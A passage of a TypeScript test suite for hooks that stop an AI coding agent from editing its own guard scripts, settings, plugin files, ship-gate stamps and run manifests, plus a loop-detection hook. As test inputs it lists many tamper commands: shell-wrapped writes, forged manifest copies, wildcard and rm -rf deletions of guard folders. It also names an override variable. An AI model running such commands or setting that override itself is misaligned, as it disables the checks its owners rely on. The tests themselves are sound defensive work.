      const r = runHookRaw(RUNGUARD, proj, cwdPayload(c, proj), env);
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain("can't read the batch-run list");
      expect(r.stderr, c).toContain("needs the owner's go-ahead");
      expect(r.stderr, c).not.toMatch(/[A-Z_]+=1/);
    }
    // ...the run's own worktree is still left alone, and harmless commands pass
    const wt = join(freshDir("cairn-hooks-runguard-wt-"), "tree");
    execFileSync("git", ["worktree", "add", "-q", "-b", "runbranch", wt], { cwd: proj });
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git checkout -b other", wt), env).status).toBe(0);
    expect(runHookRaw(RUNGUARD, proj, cwdPayload("git status", proj), env).status).toBe(0);
  });
});

describe("posttooluse-loopcheck", () => {
  const LOOPCHECK = join(SCRIPTS, "posttooluse-loopcheck.mjs");

  function loopStatePathFor(home: string, projectDir: string): string {
    const { base, hash } = hashAndBaseForEnvDir(projectDir);
    return join(home, ".cairn", "loop", `${base}-${hash}.json`);
  }

  const call = (tool: string, input: unknown, session = "s1") =>
    JSON.stringify({ tool_name: tool, tool_input: input, session_id: session, cwd: "" });

  /** One hook run; returns parsed additionalContext (or null when it stayed quiet). */
  function run(proj: string, home: string, payloadJson: string): string | null {
    const r = runHookRaw(LOOPCHECK, proj, payloadJson, { HOME: home });
    expect(r.status).toBe(0);
    if (!r.stdout.trim()) return null;
    return JSON.parse(r.stdout).hookSpecificOutput.additionalContext as string;
  }

  it("stays quiet for the first two identical calls, nudges on the third", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    const p = call("Bash", { command: "npm test" });
    expect(run(proj, home, p)).toBeNull();
    expect(run(proj, home, p)).toBeNull();
    const nudge = run(proj, home, p);
    expect(nudge).toContain("3 identical Bash calls");
    expect(nudge).toContain("trace");
  });

  it("says it once, then goes quiet for the rest of the streak", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    const p = call("Bash", { command: "npm test" });
    for (let i = 0; i < 2; i++) run(proj, home, p);
    expect(run(proj, home, p)).not.toBeNull();
    expect(run(proj, home, p)).toBeNull();
    expect(run(proj, home, p)).toBeNull();
  });

  it("any different call resets the streak", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    const a = call("Bash", { command: "npm test" });
    run(proj, home, a);
    run(proj, home, a);
    run(proj, home, call("Bash", { command: "git status" })); // breaks it
    expect(run(proj, home, a)).toBeNull();
    expect(run(proj, home, a)).toBeNull();
    expect(run(proj, home, a)).not.toBeNull();
  });

  it("same input, different tool is a different call", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    const input = { file_path: "a.ts" };
    run(proj, home, call("Read", input));
    run(proj, home, call("Read", input));
    expect(run(proj, home, call("Edit", input))).toBeNull();
  });

  it("key order does not make two identical inputs look different", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    run(proj, home, call("Edit", { file_path: "a.ts", old_string: "x" }));
    run(proj, home, call("Edit", { old_string: "x", file_path: "a.ts" }));
    expect(run(proj, home, call("Edit", { file_path: "a.ts", old_string: "x" })))
      .not.toBeNull();
  });

  it("a new session starts its own streak", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    const input = { command: "npm test" };
    run(proj, home, call("Bash", input, "s1"));
    run(proj, home, call("Bash", input, "s1"));
    expect(run(proj, home, call("Bash", input, "s2"))).toBeNull();
  });

  it("a corrupt state file costs nothing but the streak", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    const path = loopStatePathFor(home, proj);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, "{ not json");
    expect(run(proj, home, call("Bash", { command: "x" }))).toBeNull();
    expect(JSON.parse(readFileSync(path, "utf8")).count).toBe(1);
  });

  /**
   * The issue asks this hook to respect the breadcrumb's wall-clock budget.
   * Asserted structurally rather than as another wall-clock pin: the two
   * existing pins already measure runner load instead of hook cost (#169),
   * and a third instance of a known-flaky pattern is not evidence. What
   * actually makes a PostToolUse hook slow is shelling out or reaching the
   * network, so that is what gets pinned -- one small read, one small write,
   * no child processes.
   */
  it("does its work without spawning anything or touching the network", () => {
    const src = readFileSync(join(SCRIPTS, "posttooluse-loopcheck.mjs"), "utf8");
    expect(src).not.toMatch(/child_process|execFile|spawn|execSync/);
    expect(src).not.toMatch(/node:https?|fetch\(/);
    expect(src).toMatch(/atomicWriteJson/); // one write, via the shared helper
  });

  it("writes exactly one state file and nothing else", () => {
    const proj = freshDir("cairn-hooks-loop-");
    const home = freshDir("cairn-hooks-loop-home-");
    run(proj, home, call("Bash", { command: "npm test" }));
    expect(readdirSync(join(home, ".cairn"))).toEqual(["loop"]);
    expect(readdirSync(join(home, ".cairn", "loop")).length).toBe(1);
  });
});

describe("harness guard hook", () => {
  const editPayload = (filePath: string, tool = "Edit") =>
    JSON.stringify({ tool_name: tool, tool_input: { file_path: filePath }, cwd: "" });
  const bashPayload = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" });

  /** The guard reads no project state, so a bare temp dir is a complete fixture. */
  function proj(): string {
    return freshDir("cairn-hooks-harnessguard-");
  }

  it("refuses an Edit to every protected surface, naming the file", () => {
    const p = proj();
    const cases: Array<[string, string]> = [
      ["hooks/hooks.json", "hook directory"],
      ["hooks/scripts/pretooluse-leakguard.mjs", "hook directory"],
      [".mcp.json", "MCP server config"],
      [".claude/settings.json", "settings file"],
      [".claude/settings.local.json", "settings file"],
      [".claude-plugin/plugin.json", "plugin manifest"],
      [".claude-plugin/marketplace.json", "plugin manifest"],
    ];
    for (const [file, phrase] of cases) {
      const r = runHookRaw(HARNESSGUARD, p, editPayload(join(p, file)));
      expect(r.status, file).toBe(2);
      expect(r.stderr, file).toContain(phrase);
      expect(r.stderr, file).toContain(file);
    }
  });

  it("refuses Write and NotebookEdit on the same surfaces", () => {
    const p = proj();
    expect(runHookRaw(HARNESSGUARD, p,
      editPayload(join(p, ".mcp.json"), "Write")).status).toBe(2);
    expect(runHookRaw(HARNESSGUARD, p, JSON.stringify({
      tool_name: "NotebookEdit", tool_input: { notebook_path: join(p, "hooks/x.ipynb") }, cwd: "",
    })).status).toBe(2);
  });

  it("ordinary project files pass, including look-alikes", () => {
    const p = proj();
    for (const file of [
      "server/src/index.ts", "docs/hooks.md", "settings.json", "my.mcp.json",
      "hooksy/thing.json", "server/hooks/helper.ts",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, editPayload(join(p, file))).status, file).toBe(0);
    }
  });

  it("protects the machine-wide settings from any project", () => {
    const p = proj();
    const home = freshDir("cairn-hooks-harnessguard-home-");
    const r = runHookRaw(HARNESSGUARD, p,
      editPayload(join(home, ".claude", "settings.json")), { HOME: home });
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("machine-wide");
  });

  it("a path outside the project is not this guard's business", () => {
    const p = proj();
    const other = freshDir("cairn-hooks-harnessguard-other-");
    expect(runHookRaw(HARNESSGUARD, p,
      editPayload(join(other, "hooks", "hooks.json"))).status).toBe(0);
  });

  it("catches the shell write shapes an agent actually uses", () => {
    const p = proj();
    for (const c of [
      "echo '{}' > hooks/hooks.json",
      "cat x >> .mcp.json",
      "sed -i '' 's/a/b/' .claude/settings.json",
      "cp /tmp/evil.json .claude-plugin/plugin.json",
      "mv /tmp/x hooks/scripts/pretooluse-leakguard.mjs",
      "rm hooks/scripts/pretooluse-leakguard.mjs",
      'tee ".mcp.json" < /tmp/x',
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c)).status, c).toBe(2);
    }
  });

  it("a literal target after an unquoted $(...) is still the command's operand (#319)", () => {
    const p = proj();
    const r = runHookRaw(HARNESSGUARD, p, bashPayload("cp $(echo evil.json) hooks/hooks.json"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("hook directory");
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("cp $(ls *.txt | head -1) /tmp/")).status).toBe(0);
  });

  it("a write inside a process substitution or arithmetic is seen (#320)", () => {
    const p = proj();
    const r = runHookRaw(HARNESSGUARD, p, bashPayload("cat a.txt | tee >(cat > hooks/hooks.json)"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("hook directory");
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("cat a.txt > >(tee hooks/hooks.json)")).status).toBe(2);
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("echo $((1 + $(rm -rf hooks | wc -c)))")).status).toBe(2);
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("diff <(sort a) <(sort b)")).status).toBe(0);
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("paste <(cut -f1 a) <(cut -f2 b) > out.txt")).status).toBe(0);
  });

  it("a target under $(pwd) is judged in the shell's folder, not refused as unknown (#321)", () => {
    const p = proj();
    mkdirSync(join(p, "hooks"), { recursive: true });
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("echo x > $(pwd)/notes.txt")).status).toBe(0);
    expect(runHookRaw(HARNESSGUARD, p, bashPayload('cp a.txt "$(pwd)/notes.txt"')).status).toBe(0);
    const r = runHookRaw(HARNESSGUARD, p, bashPayload("echo x > $(pwd)/hooks/hooks.json"));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("hook directory");
    expect(runHookRaw(HARNESSGUARD, p, bashPayload("echo x > $(somecmd)/notes.txt")).status).toBe(2);
  });

  it("a line nested deeper than the reader reads is refused unread, and fast (#321)", () => {
    const p = proj();
    const nested = (d: number) => "echo " + "$(a ".repeat(d) + "rm -rf hooks" + ")".repeat(d);
    const r = runHookRaw(HARNESSGUARD, p, bashPayload(nested(9)));
    expect(r.status).toBe(2);
    expect(r.stderr).toContain("deeper than the guard reads");
    const t0 = Date.now();
    expect(runHookRaw(HARNESSGUARD, p, bashPayload(nested(120))).status).toBe(2);
    expect(Date.now() - t0).toBeLessThan(1500); // ~9 s before the cap; a generous ceiling, not a benchmark
  });

  it("reading a protected file stays frictionless", () => {
    const p = proj();
    for (const c of [
      "cat hooks/hooks.json",
      "grep -n matcher hooks/hooks.json",
      "node scripts/check-surface.mjs",
      "git diff .mcp.json",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c)).status, c).toBe(0);
    }
  });

  // #240: the guard used to treat ANY `>` as a write (2>/dev/null, 2>&1, a
  // `=>` inside a quoted pattern) and then refuse if ANY token named a
  // protected path. Each pair below is one protected path: the write must
  // still be refused, the read must pass. The reads are the real commands
  // that were refused while doing ordinary work.
  it("refuses the write and passes the read, path by path (#240)", () => {
    const p = proj();
    const pairs: Array<[write: string, read: string]> = [
      ["node gen.mjs > hooks/scripts/cost-report.mjs",
        "node hooks/scripts/cost-report.mjs --issue 233 2>/dev/null | tail -3"],
      ["echo x &> .mcp.json",
        'grep -rn -E "evidence\\|waived|=> " server/src hooks/scripts scripts | head'],
      ["cat a | tee hooks/hooks.json",
        "cat hooks/hooks.json 2>&1 | head -20"],
      ["cp /tmp/evil.mjs hooks/scripts/pretooluse-leakguard.mjs",
        "cp hooks/scripts/pretooluse-leakguard.mjs /tmp/review-copy.mjs"],
      ["ls > /dev/null; sed -i '' 's/a/b/' .claude/settings.json",
        "ls hooks/scripts > /tmp/listing.txt"],
      ["dd if=/tmp/x of=.claude-plugin/plugin.json",
        "dd if=.claude-plugin/plugin.json of=/tmp/plugin-copy.json"],
      ["git checkout -- hooks/hooks.json",
        "git diff --stat -- hooks/hooks.json"],
      ["node hooks/scripts/leak-patterns.mjs a.md && rm hooks/scripts/lib.mjs",
        "node hooks/scripts/leak-patterns.mjs a.md && echo clean"],
    ];
    for (const [write, read] of pairs) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(write)).status, write).toBe(2);
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(read)).status, read).toBe(0);
    }
  });

  it("text that is data, not a command, never reads as a write (#240)", () => {
    const p = proj();
    for (const c of [
      // a commit message naming a hook path, carried in a heredoc
      "git commit -F - <<'EOF'\nfix: tidy hooks/scripts/lib.mjs > old wording\nEOF",
      // a quoted pattern containing a redirect-looking arrow and a hook path
      "grep -n 'x > hooks/hooks.json' docs/notes.md",
      // a here-string
      "grep -c hooks <<< 'cat > hooks/hooks.json'",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c)).status, c).toBe(0);
    }
    // ...but a real write after a heredoc is still seen
    expect(runHookRaw(HARNESSGUARD, p, bashPayload(
      "cat <<'EOF' > hooks/hooks.json\n{}\nEOF")).status).toBe(2);
  });

  it("a write handed to another shell as a string is still a write (#240)", () => {
    const p = proj();
    // The old text-match missed all three; reading writes properly closes them.
    for (const c of [
      'bash -c "echo > hooks/hooks.json"',
      "sh -c 'rm hooks/hooks.json'",
      'eval "rm .mcp.json"',
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c)).status, c).toBe(2);
    }
    expect(runHookRaw(HARNESSGUARD, p,
      bashPayload('bash -c "cat hooks/hooks.json | head"')).status).toBe(0);
  });

  // #286, matching the run guard's #262: a refusal names the owner's ways
  // to approve and the where-did-this-come-from check, and never hands the
  // agent a paste-ready override prefix.
  it("refusals name the owner's ways to approve, never the override prefix (#286)", () => {
    const p = proj();
    const home = freshDir("cairn-hooks-harnessguard-home-");
    for (const payload of [
      editPayload(join(p, "hooks/hooks.json")),
      editPayload(join(p, ".claude/settings.json"), "Write"),
      bashPayload("echo '{}' > hooks/hooks.json"),
      bashPayload("rm -rf .claude"),
      bashPayload("echo 'CAIRN_HARNESS_EDIT=1' > .mcp.json"),
      bashPayload("cd \"$d\" && echo x > out.txt"),
      editPayload(join(home, ".claude", "settings.json")),
    ]) {
      const r = runHookRaw(HARNESSGUARD, p, payload, { HOME: home });
      expect(r.status, payload).toBe(2);
      expect(r.stderr, payload).toContain("needs the owner's go-ahead");
      expect(r.stderr, payload).toContain("`!` in your prompt");
      expect(r.stderr, payload).toContain("start the session with CAIRN_HARNESS_EDIT set to 1");
      expect(r.stderr, payload).toContain("check where the");
      expect(r.stderr, payload).toContain("not the owner asking");
      expect(r.stderr, payload).not.toContain("CAIRN_HARNESS_EDIT=1");
      expect(r.stderr, payload).not.toMatch(/[A-Z_]+=1/);
      expect(r.stderr, payload).not.toMatch(/prefix/i);
    }
  });

  it("CAIRN_HARNESS_EDIT=1 overrides, by env for any tool and by prefix for Bash", () => {
    const p = proj();
    expect(runHookRaw(HARNESSGUARD, p, editPayload(join(p, "hooks/hooks.json")),
      { CAIRN_HARNESS_EDIT: "1" }).status).toBe(0);
    expect(runHookRaw(HARNESSGUARD, p,
      bashPayload("CAIRN_HARNESS_EDIT=1 echo '{}' > hooks/hooks.json")).status).toBe(0);
    // Prefix-only: a mention elsewhere in the line does not bypass.
    expect(runHookRaw(HARNESSGUARD, p,
      bashPayload("echo 'CAIRN_HARNESS_EDIT=1' > hooks/hooks.json")).status).toBe(2);
  });

  it("unrelated tools are not scanned at all", () => {
    const p = proj();
    expect(runHookRaw(HARNESSGUARD, p, JSON.stringify({
      tool_name: "Read", tool_input: { file_path: join(p, "hooks/hooks.json") }, cwd: "",
    })).status).toBe(0);
  });
});

// #263: the ship-gate stamp and the run manifests are what the run guard
// trusts to allow a push, so a plain agent write must not forge them. They
// live outside the project, under CAIRN_HOME and ~/.cairn -- both count.
// The server writes them with plain fs calls the hook never sees (see
// ship-gate.test.ts), and auto's run report beside the manifests stays
// writable.
describe("harness guard protects the ship gate and run manifests (#263)", () => {
  // `~/@cairn` below is the cairn home folder, spelled apart so no line in
  // this file reads as a planning-directory path to the commit leak guard.
  const sh = (s: string) => s.replaceAll("@cairn", ".cairn");
  const filePayload = (filePath: string, tool = "Write") =>
    JSON.stringify({ tool_name: tool, tool_input: { file_path: sh(filePath) }, cwd: "" });
  const bashPayload = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command: sh(command) }, cwd: "" });

  /** A project, a home and a separate CAIRN_HOME, each holding a stamp, a manifest and a report. */
  function fixture() {
    const p = freshDir("cairn-hooks-shipgate-proj-");
    const home = freshDir("cairn-hooks-shipgate-home-");
    const cairnHome = freshDir("cairn-hooks-shipgate-cairnhome-");
    for (const base of [join(home, ".cairn"), cairnHome]) {
      mkdirSync(join(base, "ship-gate"), { recursive: true });
      mkdirSync(join(base, "runs"), { recursive: true });
      writeFileSync(join(base, "ship-gate", "proj-0123456789abcdef.json"), "{}");
      writeFileSync(join(base, "runs", "proj-0123456789abcdef-r1.json"), "{}");
      writeFileSync(join(base, "runs", "proj-0123456789abcdef-r1-report.md"), "# run\n");
    }
    const env = { HOME: home, CAIRN_HOME: cairnHome };
    return { p, home, cairnHome, env };
  }

  it("refuses the file tools on the stamp and manifests in both cairn homes, naming them", () => {
    const { p, home, cairnHome, env } = fixture();
    const cases: Array<[string, string]> = [
      [join(cairnHome, "ship-gate", "x.json"), "ship-gate stamp"],
      [join(cairnHome, "ship-gate", "proj-0123456789abcdef.json"), "ship-gate stamp"],
      [join(cairnHome, "runs", "r1.json"), "run manifests"],
      [join(home, ".cairn", "ship-gate", "x.json"), "ship-gate stamp"],
      [join(home, ".cairn", "runs", "r1.json"), "run manifests"],
      ["~/@cairn/runs/r1.json", "run manifests"],
    ];
    for (const [file, phrase] of cases) {
      for (const tool of ["Write", "Edit"]) {
        const r = runHookRaw(HARNESSGUARD, p, filePayload(file, tool), env);
        expect(r.status, `${tool} ${file}`).toBe(2);
        expect(r.stderr, file).toContain(phrase);
      }
    }
    expect(runHookRaw(HARNESSGUARD, p, JSON.stringify({
      tool_name: "NotebookEdit", tool_input: { notebook_path: join(cairnHome, "ship-gate", "x.ipynb") }, cwd: "",
    }), env).status).toBe(2);
  });

  it("the run report, the rest of the cairn home, and reads pass", () => {
    const { p, home, cairnHome, env } = fixture();
    for (const file of [
      join(cairnHome, "runs", "r1-report.md"),
      join(home, ".cairn", "runs", "proj-0123456789abcdef-r1-report.md"),
      join(home, ".cairn", "handoff", "proj-0123456789abcdef.json"),
      join(cairnHome, "banner", "proj.md"),
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, filePayload(file), env).status, file).toBe(0);
    }
    for (const c of [
      "echo x > ~/@cairn/runs/r1-report.md",
      "rm ~/@cairn/runs/proj-0123456789abcdef-r1-report.md",
      "sed -i '' 's/a/b/' ~/@cairn/runs/*.md",
      "cat ~/@cairn/runs/proj-0123456789abcdef-r1.json",
      "ls ~/@cairn/ship-gate && cat $CAIRN_HOME/ship-gate/*.json",
      "mkdir -p ~/@cairn/runs",
      "rm -rf ~/@cairn/handoff",
      "find ~/@cairn -name '*-report.md' -delete",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c), env).status, c).toBe(0);
    }
  });

  it("refuses shell writes, with ~, $HOME, ${HOME} and $CAIRN_HOME spelled out", () => {
    const { p, cairnHome, env } = fixture();
    for (const c of [
      `echo {} > ${join(cairnHome, "ship-gate", "x.json")}`,
      "echo {} > ~/@cairn/ship-gate/x.json",
      "echo {} > $HOME/@cairn/runs/a.json",
      "echo {} > ${HOME}/@cairn/runs/a.json",
      "echo {} > $CAIRN_HOME/runs/a.json",
      "cp /tmp/forged.json ~/@cairn/runs/proj-0123456789abcdef-r1.json",
      "cp /tmp/forged.json ~/@cairn/runs/",
      "tar -C ~/@cairn/ship-gate -xf stamp.tar",
      "cd ~/@cairn/runs && echo {} > x.json",
      "cd ~/@cairn && echo {} > ship-gate/x.json",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c), env).status, c).toBe(2);
    }
  });

  it("removing the stamp or manifests, their folder, or a folder holding them is refused", () => {
    const { p, cairnHome, env } = fixture();
    for (const c of [
      "rm ~/@cairn/runs/proj-0123456789abcdef-r1.json",
      "rm -rf ~/@cairn/runs",
      "rm -rf ~/@cairn/ship-gate",
      "rm -rf ~/@cairn",
      `rm -rf ${cairnHome}`,
      "mv ~/@cairn ~/@cairn-old",
      "find ~/@cairn -name '*.json' -delete",
      "find ~/@cairn/ship-gate -name nothing-matches -delete",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c), env).status, c).toBe(2);
    }
  });

  it("a wildcard that can expand to the stamp or a manifest is refused", () => {
    const { p, env } = fixture();
    for (const c of [
      "sed -i '' 's/running/stopped/' ~/@cairn/runs/*",
      "rm ~/@cairn/runs/proj*",
      "rm ~/@cairn/runs/*.json",
      "rm -rf ~/@cairn/*",
      "rm -rf ~/.c*",
      "echo {} > ~/@cairn/ship-gate/*",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c), env).status, c).toBe(2);
    }
  });

  it("with no CAIRN_HOME set, ~/@cairn alone is protected", () => {
    const { p, home } = fixture();
    const env = { HOME: home };
    const without = (payload: string) => {
      const r = spawnSync(process.execPath, [HARNESSGUARD], {
        cwd: p,
        env: (() => {
          const e: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, ...env };
          delete e.CAIRN_HOME;
          return e;
        })(),
        input: payload,
        encoding: "utf8",
        timeout: 5000,
      });
      return r.status;
    };
    expect(without(bashPayload("echo {} > ~/@cairn/runs/x.json"))).toBe(2);
    expect(without(filePayload(join(home, ".cairn", "ship-gate", "x.json")))).toBe(2);
    expect(without(bashPayload("echo x > ~/@cairn/runs/x-report.md"))).toBe(0);
  });
});

// #267: the guard protected the project's own hooks/ but not the plugin
// copy that actually runs -- the plugin root Claude Code hands its hooks
// (under ~/.claude/plugins/cache/ for an install), the plugin registry
// files, and the project's .claude/hooks/ and .claude/agents/.
describe("harness guard protects the plugin copy that runs (#267)", () => {
  const filePayload = (filePath: string, tool = "Write") =>
    JSON.stringify({ tool_name: tool, tool_input: { file_path: filePath }, cwd: "" });
  const bashPayload = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" });

  /** Exit status and stderr with CLAUDE_PLUGIN_ROOT as given -- or unset, for the script's own location. */
  function run(projectDir: string, payload: string, env: Record<string, string | undefined> = {}) {
    const e: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: projectDir, ...env };
    for (const k of Object.keys(e)) if (e[k] === undefined || k === "CAIRN_HARNESS_EDIT") delete e[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: projectDir, env: e, input: payload, encoding: "utf8", timeout: 5000,
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  /** A fake installed plugin root outside the project, holding hooks like the real one. */
  function pluginRoot(): string {
    const root = freshDir("cairn-hooks-pluginroot-");
    mkdirSync(join(root, "hooks", "scripts"), { recursive: true });
    writeFileSync(join(root, "hooks", "hooks.json"), "{}");
    writeFileSync(join(root, "hooks", "scripts", "pretooluse-runguard.mjs"), "");
    return root;
  }

  it("refuses writes into the live plugin root when it lies outside the project", () => {
    const p = freshDir("cairn-hooks-plugin-proj-");
    const root = pluginRoot();
    const env = { CLAUDE_PLUGIN_ROOT: root };
    for (const file of ["hooks/hooks.json", "hooks/scripts/pretooluse-runguard.mjs", "server/dist/index.js"]) {
      for (const tool of ["Write", "Edit"]) {
        const r = run(p, filePayload(join(root, file), tool), env);
        expect(r.status, `${tool} ${file}`).toBe(2);
        expect(r.stderr, file).toContain("the installed plugin these hooks run from");
      }
    }
    for (const c of [
      `echo {} > ${join(root, "hooks", "hooks.json")}`,
      `cd ${root} && echo {} > hooks/hooks.json`,
      `sed -i '' 's/a/b/' ${join(root, "hooks", "*.json")}`,
      `rm -rf ${root}`,
      `find ${root} -name '*.mjs' -delete`,
    ]) {
      expect(run(p, bashPayload(c), env).status, c).toBe(2);
    }
  });

  it("reads of the plugin root, and a plain npm rebuild inside it, pass", () => {
    const p = freshDir("cairn-hooks-plugin-proj-");
    const root = pluginRoot();
    const env = { CLAUDE_PLUGIN_ROOT: root };
    for (const c of [
      `cat ${join(root, "hooks", "hooks.json")}`,
      `grep -rn matcher ${join(root, "hooks")}`,
      `cd ${root} && npm rebuild`,
      `npm rebuild --prefix ${root}`,
      `cp ${join(root, "hooks", "hooks.json")} /tmp/hooks-review-copy.json`,
    ]) {
      expect(run(p, bashPayload(c), env).status, c).toBe(0);
    }
  });

  it("with no CLAUDE_PLUGIN_ROOT, the checkout running the script is the plugin root", () => {
    const p = freshDir("cairn-hooks-plugin-proj-");
    const checkout = resolve(SCRIPTS, "..", "..");
    expect(run(p, filePayload(join(checkout, "hooks", "hooks.json")), { CLAUDE_PLUGIN_ROOT: undefined }).status)
      .toBe(2);
    expect(run(p, filePayload(join(checkout, "README.md")), { CLAUDE_PLUGIN_ROOT: undefined }).status).toBe(2);
    // a different checkout is somebody else's business
    expect(run(p, filePayload(join(pluginRoot(), "hooks", "hooks.json")), { CLAUDE_PLUGIN_ROOT: undefined }).status)
      .toBe(0);
  });

  it("a dev install whose plugin root is the project keeps the project rules", () => {
    const p = freshDir("cairn-hooks-plugin-proj-");
    const env = { CLAUDE_PLUGIN_ROOT: p };
    expect(run(p, filePayload(join(p, "hooks", "hooks.json")), env).status).toBe(2);
    expect(run(p, filePayload(join(p, "README.md")), env).status).toBe(0);
    expect(run(p, filePayload(join(p, "server", "src", "index.ts")), env).status).toBe(0);
  });

  it("a project inside the plugin root (a worktree) stays ordinary work; the rest of the root does not", () => {
    const root = pluginRoot();
    const wt = join(root, ".claude", "worktrees", "wt");
    mkdirSync(join(wt, "build"), { recursive: true });
    const env = { CLAUDE_PLUGIN_ROOT: root };
    for (const file of ["src/a.ts", "README.md"]) {
      expect(run(wt, filePayload(join(wt, file)), env).status, file).toBe(0);
    }
    for (const c of ["rm -rf build/*", "find . -name '*.tmp' -delete", "echo x > notes.txt"]) {
      expect(run(wt, bashPayload(c), env).status, c).toBe(0);
    }
    // the worktree's own hooks/ is still its project's hook directory
    expect(run(wt, filePayload(join(wt, "hooks", "hooks.json")), env).status).toBe(2);
    expect(run(wt, filePayload(join(root, "hooks", "hooks.json")), env).status).toBe(2);
    for (const c of ["echo x > ../../../hooks/hooks.json", "rm -rf ../other-wt", `rm -rf ${root}`]) {
      expect(run(wt, bashPayload(c), env).status, c).toBe(2);
    }
  });

  it("refuses writes to ~/.claude/plugins: the registry files, the cache, the marketplaces", () => {
    const p = freshDir("cairn-hooks-plugin-proj-");
    const home = freshDir("cairn-hooks-plugin-home-");
    const env = { HOME: home, CLAUDE_PLUGIN_ROOT: pluginRoot() };
    for (const file of [
      join(home, ".claude", "plugins", "installed_plugins.json"),
      join(home, ".claude", "plugins", "known_marketplaces.json"),
      join(home, ".claude", "plugins", "cache", "mkt", "cairn", "1.0.0", "hooks", "hooks.json"),
      join(home, ".claude", "plugins", "marketplaces", "mkt", ".claude-plugin", "marketplace.json"),
    ]) {
      const r = run(p, filePayload(file), env);
      expect(r.status, file).toBe(2);
      expect(r.stderr, file).toContain("installed plugins and their registry");
    }
    for (const c of [
      "echo {} > ~/.claude/plugins/installed_plugins.json",
      "rm -rf ~/.claude/plugins",
      "rm -rf ~/.claude/plugins/cache",
    ]) {
      expect(run(p, bashPayload(c), env).status, c).toBe(2);
    }
    expect(run(p, bashPayload("cat ~/.claude/plugins/installed_plugins.json"), env).status).toBe(0);
  });

  it("refuses writes to the project's .claude/hooks/ and .claude/agents/", () => {
    const p = freshDir("cairn-hooks-plugin-proj-");
    for (const [file, phrase] of [
      [".claude/hooks/x.sh", "Claude hooks"],
      [".claude/agents/a.md", "agent definitions"],
      ["packages/web/.claude/agents/a.md", "agent definitions"],
    ]) {
      const r = run(p, filePayload(join(p, file)));
      expect(r.status, file).toBe(2);
      expect(r.stderr, file).toContain(phrase);
    }
    for (const c of [
      "echo x > .claude/hooks/x.sh",
      "rm -rf .claude/agents",
      "cp a.md .claude/agents/",
      "rm .claude/*/a.md",
      "find .claude/hooks -name nothing-matches -delete",
    ]) {
      expect(run(p, bashPayload(c)).status, c).toBe(2);
    }
    for (const c of ["cat .claude/agents/a.md", "ls .claude/hooks"]) {
      expect(run(p, bashPayload(c)).status, c).toBe(0);
    }
    // the rest of .claude/ is ordinary work (skills and commands joined the set in #309)
    expect(run(p, filePayload(join(p, ".claude", "worktrees", "wt", "src", "a.ts"))).status).toBe(0);
  });
});

// #269: Cursor runs the guards from .cursor/hooks.json and the scripts
// installed under .cursor/hooks/, so those are the hook config there.
describe("harness guard protects Cursor's hook config (#269)", () => {
  const filePayload = (filePath: string) =>
    JSON.stringify({ tool_name: "Write", tool_input: { file_path: filePath }, cwd: "" });
  const bashPayload = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" });

  it("refuses writes to .cursor/hooks.json and anything under .cursor/hooks/", () => {
    const p = freshDir("cairn-hooks-cursor-");
    for (const file of [".cursor/hooks.json", ".cursor/hooks/cairn/cursor-adapter.mjs",
      ".cursor/hooks/cairn/pretooluse-harnessguard.mjs"]) {
      const r = runHookRaw(HARNESSGUARD, p, filePayload(join(p, file)));
      expect(r.status, file).toBe(2);
      expect(r.stderr, file).toContain("Cursor's hooks");
    }
    for (const c of [
      "echo {} > .cursor/hooks.json",
      "rm -rf .cursor/hooks",
      "rm -rf .cursor",
      "cp /tmp/evil.json .cursor/",
      "rsync -a /tmp/cfg/ .cursor/",
      "sed -i '' 's/a/b/' .cursor/*.json",
      "find .cursor/hooks -name nothing-matches -delete",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c)).status, c).toBe(2);
    }
  });

  // .cursor/mcp.json left this list with #298: it is Cursor's MCP server config.
  it("the rest of .cursor/ and reads pass", () => {
    const p = freshDir("cairn-hooks-cursor-");
